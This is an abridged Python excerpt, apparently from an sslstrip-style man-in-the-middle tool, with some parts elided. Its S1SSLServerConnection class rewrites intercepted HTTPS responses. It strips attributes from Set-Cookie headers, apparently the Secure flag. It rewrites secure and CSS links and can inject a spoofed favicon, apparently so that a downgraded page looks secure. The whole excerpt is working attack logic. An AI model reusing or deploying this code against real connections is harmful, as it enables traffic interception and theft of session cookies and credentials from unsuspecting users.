...
class S1SSLServerConnection(S1ServerConnection):
    ...
    def __init__(self, command, uri, postData, headers, client):
        S1ServerConnection.__init__(self, command, uri, postData, headers, client)
    ...
    def handleHeader(self, key, value):
        if (key.lower() == 'set-cookie'):
            value = S1SSLServerConnection.cookieExpression.sub("\g<1>", value)

        S1ServerConnection.handleHeader(self, key, value)
    ...
    def replaceCssLinks(self, data):
        iterator = re.finditer(S1SSLServerConnection.cssExpression, data)
    ...
    def replaceFavicon(self, data):
        match = re.search(S1SSLServerConnection.iconExpression, data)

        if (match != None):
            data = re.sub(S1SSLServerConnection.iconExpression,
                          "<link rel=\"SHORTCUT ICON\" href=\"/favicon-x-favicon-x.ico\">", data)
        else:
            data = re.sub(S1SSLServerConnection.headExpression,
                          "<head><link rel=\"SHORTCUT ICON\" href=\"/favicon-x-favicon-x.ico\">", data)
            
        return data
        
    def replaceSecureLinks(self, data):
        data = S1ServerConnection.replaceSecureLinks(self, data)
        data = self.replaceCssLinks(data)

        if (self.urlMonitor.isFaviconSpoofing()):
            data = self.replaceFavicon(data)

        iterator = re.finditer(S1SSLServerConnection.linkExpression, data)
